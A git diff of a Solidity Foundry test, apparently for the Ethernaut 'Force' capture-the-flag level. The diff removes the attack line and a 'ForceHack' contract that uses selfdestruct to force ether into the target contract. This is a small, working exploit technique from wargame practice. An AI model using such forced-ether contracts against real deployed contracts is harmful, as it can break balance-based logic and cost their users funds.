@@ -27,8 +27,7 @@ contract ForceTest is Test {
         /****************
          *    Attack     *
          *************** */
-        // simply instanciate the contract and the selfdestruct method will be called on the base contract
-        new ForceHack{value: 1 ether}(payable(levelAddress));
+
         /*****************
          *Level Submission*
          ***************  */
@@ -37,14 +36,5 @@ contract ForceTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
-    }
-}
-
-contract ForceHack {
-    constructor(address payable attacker) payable {
-        // very easy here, we just need to call selfdestruct
-        // we can do it directly in the constructor
-        require(msg.value > 0); // require a bit of ETH to be sent otherwise the base contract doesn't have funds
-        selfdestruct(attacker);
     }
 }
